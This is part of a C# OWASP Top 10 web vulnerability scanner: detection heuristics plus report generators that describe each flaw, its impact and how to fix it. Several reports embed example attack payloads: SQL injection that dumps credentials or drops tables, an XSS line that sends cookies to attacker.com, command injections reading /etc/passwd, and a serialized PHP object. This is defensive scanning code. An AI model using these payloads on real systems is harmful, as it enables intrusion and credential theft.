            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
            }

            return result;
        }

        private bool IsSQLInjectionVulnerable(string response)
        {
            var sqlErrors = new[]
            {
                "SQL syntax", "mysql_fetch", "mysqli", "ORA-", "Microsoft SQL",
                "ODBC", "PostgreSQL", "sqlite_", "SQLite", "syntax error",
                "mysql_num_rows", "mysql_query", "pg_query", "Warning: pg_"
            };

            return sqlErrors.Any(error => response.Contains(error, StringComparison.OrdinalIgnoreCase));
        }

        private bool IsCommandInjectionVulnerable(string response)
        {
            var cmdIndicators = new[]
            {
                "uid=", "gid=", "root:", "bin/bash", "System.Diagnostics",
                "cmd.exe", "command not found", "/etc/passwd", "Windows IP"
            };

            return cmdIndicators.Any(indicator => response.Contains(indicator, StringComparison.OrdinalIgnoreCase));
        }

        private bool IsLoginSuccessful(string response)
        {
            var successIndicators = new[] { "dashboard", "welcome", "logout", "profile", "success" };
            var failureIndicators = new[] { "invalid", "incorrect", "failed", "error", "wrong" };

            return successIndicators.Any(s => response.Contains(s, StringComparison.OrdinalIgnoreCase)) &&
                   !failureIndicators.Any(f => response.Contains(f, StringComparison.OrdinalIgnoreCase));
        }

        private List<string> ExtractParameters(string url)
        {
            var parameters = new List<string>();
            var uri = new Uri(url);
            var query = HttpUtility.ParseQueryString(uri.Query);

            foreach (string key in query.Keys)
            {
                if (!string.IsNullOrEmpty(key))
                    parameters.Add(key);
            }

            return parameters;
        }

        private string AddOrModifyParameter(string url, string param, string value)
        {
            var uriBuilder = new UriBuilder(url);
            var query = HttpUtility.ParseQueryString(uriBuilder.Query);
            query[param] = value;
            uriBuilder.Query = query.ToString();
            return uriBuilder.ToString();
        }

        private string ReplaceParameter(string url, string param, string value)
        {
            return AddOrModifyParameter(url, param, value);
        }

        private string GetBaseUrl(string url)
        {
            var uri = new Uri(url);
            return $"{uri.Scheme}://{uri.Host}";
        }

        private string FindLoginEndpoint(string url)
        {
            var baseUrl = GetBaseUrl(url);
            var loginPaths = new[] { "/login", "/signin", "/auth", "/authenticate", "/api/login" };

            // Return first potential login endpoint
            return baseUrl + loginPaths[0];
        }

        private string ExtractSessionId(string response)
        {
            // Simple session ID extraction from Set-Cookie header
            var match = Regex.Match(response, @"Set-Cookie:.*?session=([^;]+)", RegexOptions.IgnoreCase);
            return match.Success ? match.Groups[1].Value : null;
        }

        public Dictionary<string, OWASPT10ScanReport> GetAllScanResults()
        {
            return new Dictionary<string, OWASPT10ScanReport>(_scanResults);
        }

        protected virtual void OnScanProgress(OWASPT10ScanProgressEventArgs e)
        {
            ScanProgress?.Invoke(this, e);
        }

        protected virtual void OnVulnerabilityFound(OWASPT10VulnerabilityFoundEventArgs e)
        {
            VulnerabilityFound?.Invoke(this, e);
        }

        #endregion

        #region PoC Generators - Continued in next part due to length

        private string GenerateIDORPoC(string url, string param, string value, string response)
        {
            return $@"IDOR Vulnerability PoC:

1. Original Request:
   GET {url}

2. Malicious Request:
   GET {AddOrModifyParameter(url, param, value)}

3. Exploitation:
   - Modify '{param}' parameter to access unauthorized resources
   - Try values: 1, 2, admin, ../1, etc.
   - Example: {param}={value}

4. Impact:
   - Unauthorized access to other users' data
   - Data breach
   - Privacy violation

5. Remediation:
   - Implement proper authorization checks
   - Verify user owns the requested resource
   - Use indirect references (random IDs)";
        }

        private string GenerateAccessControlPoC(string url, string response)
        {
            return $@"Missing Function Level Access Control PoC:

1. Request:
   GET {url}

2. Exploitation:
   - Admin interface accessible without authentication
   - Navigate directly to: {url}
   - No authorization check performed

3. Impact:
   - Full administrative access
   - System compromise
   - Data manipulation

4. Remediation:
   - Implement authentication for admin paths
   - Add role-based access control (RBAC)
   - Use middleware/guards to protect routes";
        }

        private string GeneratePathTraversalPoC(string url, string payload)
        {
            return $@"Path Traversal PoC:

1. Malicious Request:
   GET {url}{payload}admin

2. Exploitation:
   - Use path traversal sequences: {payload}
   - Bypass access control restrictions
   - Access restricted directories

3. Impact:
   - Unauthorized file access
   - Security bypass
   - Information disclosure

4. Remediation:
   - Validate and sanitize file paths
   - Use whitelist of allowed paths
   - Implement proper access controls";
        }

        private string GenerateSecurityHeaderPoC(string header, string description)
        {
            return $@"Missing Security Header PoC:

Header: {header} ({description})

Impact:
   - Without {header}, application is vulnerable to specific attacks
   - {description} protection is disabled

Remediation:
   Add the following header to all responses:
   {header}: [appropriate value]

Example configurations:
   - Strict-Transport-Security: max-age=31536000; includeSubDomains
   - X-Frame-Options: DENY
   - X-Content-Type-Options: nosniff
   - Content-Security-Policy: default-src 'self'";
        }

        private string GenerateVerboseErrorPoC(string url)
        {
            return $@"Verbose Error Messages PoC:

Test URL: {url}

Exploitation:
   - Trigger errors by sending invalid input
   - Stack traces reveal:
     * Application structure
     * File paths
     * Database information
     * Framework details

Impact:
   - Information disclosure
   - Easier exploitation of other vulnerabilities
   - Reconnaissance for attackers

Remediation:
   - Use generic error messages in production
   - Log detailed errors server-side only
   - Implement custom error pages";
        }

        private string GenerateDirectoryListingPoC(string url)
        {
            return $@"Directory Listing PoC:

URL: {url}

Exploitation:
   - Browse to directory URL
   - View all files and subdirectories
   - Download sensitive files

Impact:
   - Information disclosure
   - Access to backup files
   - Exposure of configuration files

Remediation:
   - Disable directory listing in web server
   - Add index.html to all directories
   - Configure Options -Indexes (Apache)";
        }

        private string GenerateVulnerableComponentPoC(string component, string description)
        {
            return $@"Vulnerable Component PoC:

Component: {component}
Issue: {description}

Exploitation:
   - Application uses outdated library
   - Known CVEs exist for this version
   - Public exploits available

Impact:
   - Remote code execution (possible)
   - XSS vulnerabilities
   - Security bypass

Remediation:
   - Update to latest version
   - Review CVE databases
   - Implement dependency scanning";
        }

        private string GenerateCDNInsecurePoC()
        {
            return $@"Insecure CDN Resource PoC:

Issue: Loading resources over HTTP from CDN

Exploitation:
   - Man-in-the-middle attack
   - Replace legitimate library with malicious code
   - Inject malware into application

Impact:
   - Complete application compromise
   - User data theft
   - Malware distribution

Remediation:
   - Use HTTPS for all CDN resources
   - Implement Subresource Integrity (SRI)
   - Host critical libraries locally";
        }

        private string GenerateHTTPPoC(string url)
        {
            return $@"Unencrypted Communication PoC:

URL: {url}

Exploitation:
   - Traffic sent over unencrypted HTTP
   - Man-in-the-middle attack possible
   - Passive eavesdropping

Impact:
   - Credentials exposed
   - Session tokens stolen
   - Sensitive data intercepted

Remediation:
   - Implement HTTPS (SSL/TLS)
   - Redirect HTTP to HTTPS
   - Enable HSTS header";
        }

        private string GenerateSensitiveDataPoC(string url, string pattern)
        {
            return $@"Sensitive Data in URL PoC:

URL: {url}
Sensitive Parameter: {pattern}

Exploitation:
   - Sensitive data visible in URL
   - Logged in browser history
   - Stored in proxy logs
   - Visible in referrer headers

Impact:
   - Credential exposure
   - Token leakage
   - Privacy violation

Remediation:
   - Use POST instead of GET for sensitive data
   - Never put credentials in URLs
   - Encrypt sensitive parameters";
        }

        private string GenerateWeakCryptoPoC()
        {
            return $@"Weak Cryptographic Algorithm PoC:

Issue: Application uses MD5/SHA1/DES

Exploitation:
   - Hash collisions possible
   - Brute force attacks feasible
   - Weak encryption easily broken

Impact:
   - Password hashes cracked
   - Encrypted data decrypted
   - Integrity bypass

Remediation:
   - Use SHA-256 or bcrypt for hashing
   - Use AES-256 for encryption
   - Implement proper key management";
        }

        private string GenerateSQLInjectionPoC(string url, string param, string payload, string response)
        {
            return $@"SQL Injection PoC:

Parameter: {param}
Payload: {payload}

Malicious Request:
   GET {ReplaceParameter(url, param, payload)}

Exploitation:
   1. Inject SQL payload in '{param}' parameter
   2. Manipulate database queries
   3. Extract sensitive data

Example Payloads:
   - ' OR '1'='1
   - ' UNION SELECT username, password FROM users--
   - '; DROP TABLE users--

Impact:
   - Complete database access
   - Data theft
   - Data modification/deletion
   - Authentication bypass

Remediation:
   - Use parameterized queries
   - Implement ORM
   - Input validation
   - Least privilege database access";
        }

        private string GenerateXSSPoC(string url, string param, string payload)
        {
            return $@"Cross-Site Scripting (XSS) PoC:

Parameter: {param}
Payload: {payload}

Malicious Request:
   GET {ReplaceParameter(url, param, HttpUtility.UrlEncode(payload))}

Exploitation:
   1. Inject JavaScript in '{param}' parameter
   2. Payload executes in victim's browser
   3. Steal cookies, session tokens, perform actions

Example Payloads:
   - <script>alert(document.cookie)</script>
   - <img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>
   - <svg onload=alert('XSS')>

Impact:
   - Session hijacking
   - Credential theft
   - Phishing attacks
   - Malware distribution

Remediation:
   - HTML encode all output
   - Implement Content Security Policy
   - Use HTTPOnly cookies
   - Input validation";
        }

        private string GenerateCommandInjectionPoC(string url, string param, string payload)
        {
            return $@"Command Injection PoC:

Parameter: {param}
Payload: {payload}

Malicious Request:
   GET {ReplaceParameter(url, param, payload)}

Exploitation:
   1. Inject OS command in '{param}' parameter
   2. Execute arbitrary commands on server
   3. Full system compromise

Example Payloads:
   - ; cat /etc/passwd
   - | whoami
   - & dir
   - $(id)

Impact:
   - Remote code execution
   - Server compromise
   - Data breach
   - Malware installation

Remediation:
   - Never pass user input to system commands
   - Use safe APIs instead of shell execution
   - Input validation and sanitization
   - Principle of least privilege";
        }

        private string GenerateRateLimitPoC(string url)
        {
            return $@"Missing Rate Limiting PoC:

URL: {url}

Exploitation:
   - Send unlimited requests
   - No throttling mechanism
   - Brute force attacks possible

Impact:
   - Denial of Service (DoS)
   - Resource exhaustion
   - Brute force attacks
   - API abuse

Remediation:
   - Implement rate limiting
   - Use sliding window algorithm
   - Add CAPTCHA for sensitive operations
   - Monitor for abuse patterns";
        }

        private string GenerateBusinessLogicPoC(string url, string param)
        {
            return $@"Business Logic Flaw PoC:

Parameter: {param}
Issue: Accepts negative values

Malicious Request:
   GET {ReplaceParameter(url, param, "-1")}

Exploitation:
   - Set quantity/price to negative value
   - Receive money instead of paying
   - Manipulate business logic

Impact:
   - Financial loss
   - Inventory manipulation
   - Fraud

Remediation:
   - Validate business logic constraints
   - Implement server-side validation
   - Use positive integers for quantities/prices
   - Add transaction integrity checks";
        }

        private string GenerateWeakCredentialsPoC(string url, string username, string password)
        {
            return $@"Weak Default Credentials PoC:

Credentials: {username}/{password}

Exploitation:
   POST {url}
   Content: username={username}&password={password}

Impact:
   - Unauthorized access
   - Account takeover
   - System compromise

Remediation:
   - Force password change on first login
   - No default credentials in production
   - Implement strong password policy
   - Multi-factor authentication";
        }

        private string GenerateSessionFixationPoC(string url, string sessionId)
        {
            return $@"Session Fixation PoC:

Issue: Session ID not regenerated after login

Exploitation:
   1. Attacker gets session ID: {sessionId}
   2. Victim logs in with same session
   3. Attacker uses same session ID to access account

Impact:
   - Account hijacking
   - Unauthorized access
   - Session stealing

Remediation:
   - Regenerate session ID after authentication
   - Use secure session management
   - Implement session timeout";
        }

        private string GenerateBruteForcePoC(string url)
        {
            return $@"Missing Brute Force Protection PoC:

URL: {url}

Exploitation:
   - Send unlimited login attempts
   - No account lockout
   - No CAPTCHA
   - Automated password guessing

Impact:
   - Account compromise
   - Credential stuffing
   - Unauthorized access

Remediation:
   - Implement account lockout
   - Add CAPTCHA after failed attempts
   - Rate limiting
   - Multi-factor authentication";
        }

        private string GenerateSRIPoC()
        {
            return $@"Missing Subresource Integrity PoC:

Issue: External scripts loaded without integrity check

Exploitation:
   - If CDN compromised, malicious code injected
   - No verification of resource integrity
   - Supply chain attack

Impact:
   - Code injection
   - Application compromise
   - User data theft

Remediation:
   Add integrity attribute to script/link tags:
   <script src='https://cdn.com/lib.js'
           integrity='sha384-HASH'
           crossorigin='anonymous'></script>";
        }

        private string GenerateDeserializationPoC(string url)
        {
            return $@"Insecure Deserialization PoC:

URL: {url}

Exploitation:
   - Inject malicious serialized objects
   - Remote code execution possible
   - Application compromise

Example Payloads:
   - PHP: O:8:""stdClass"":1:{{s:4:""code"";s:10:""phpinfo();"";}}
   - Java: rO0ABXNy... (serialized exploit)
   - .NET: Binary formatted malicious object

Impact:
   - Remote code execution
   - Authentication bypass
   - Privilege escalation

Remediation:
   - Avoid deserializing untrusted data
   - Use JSON instead of binary serialization
   - Implement integrity checks
   - Whitelist allowed classes";
        }

        private string GenerateLoggingPoC()
        {
            return $@"Insufficient Security Logging PoC:

Issue: Security events not properly logged

Missing Logs:
   - Failed login attempts
   - Access control failures
   - Input validation failures
   - SQL injection attempts
   - Authentication events

Impact:
   - Delayed incident detection
   - Insufficient forensics
   - Compliance violations
   - Cannot track attackers

Remediation:
   - Log all security-relevant events
   - Implement centralized logging
   - Set up alerting
   - Include: timestamp, user, IP, action, result";
        }

        private string GenerateExceptionHandlingPoC(string url)
        {
            return $@"Unhandled Exception PoC:

URL: {url}

Exploitation:
   - Send malformed input
   - Trigger unhandled exceptions
   - Expose stack traces
   - Information disclosure

Impact:
   - Application crash
   - Information leak
   - Denial of Service
   - Debugging information exposed

Remediation:
   - Implement proper exception handling
   - Use try-catch blocks
   - Return generic error messages
   - Log errors securely";
        }

        private string GenerateNullExceptionPoC(string url)
        {
            return $@"Null Reference Exception PoC:

URL: {url}

Exploitation:
   - Send null/empty values
   - Trigger NullReferenceException
   - Application crash

Impact:
   - Denial of Service
   - Application instability
   - Information disclosure

Remediation:
   - Check for null values
   - Use null-coalescing operators
   - Implement input validation
   - Defensive programming";
        }

        #endregion
    }

    #region Supporting Classes

    public class OWASPT10ScanReport
    {
        public string Url { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public int TotalVulnerabilitiesFound { get; set; }
        public Dictionary<string, List<OWASPT10Vulnerability>> VulnerabilitiesByCategory { get; set; }
        public string OriginalRequest { get; set; }
        public string OriginalResponse { get; set; }
        public string Error { get; set; }

        public OWASPT10ScanReport()
        {
            VulnerabilitiesByCategory = new Dictionary<string, List<OWASPT10Vulnerability>>();
        }
    }

    public class OWASPT10Vulnerability
    {
        public string Category { get; set; }
        public string Type { get; set; }
        public string Severity { get; set; }
        public string Description { get; set; }
        public string TestUrl { get; set; }
        public string TestRequest { get; set; }
        public string TestResponse { get; set; }
        public string Evidence { get; set; }
        public string PoC { get; set; }
        public string CWE { get; set; }
    }

    public class TestResult
    {
        public string Url { get; set; }
        public int StatusCode { get; set; }
        public bool IsSuccessful { get; set; }
        public string Request { get; set; }
        public string Response { get; set; }
        public string Error { get; set; }
    }

    public class OWASPT10ScanProgressEventArgs : EventArgs
    {
        public string Url { get; set; }
        public string Status { get; set; }
    }

    public class OWASPT10VulnerabilityFoundEventArgs : EventArgs
    {
        public OWASPT10Vulnerability Vulnerability { get; set; }
    }

    #endregion
}
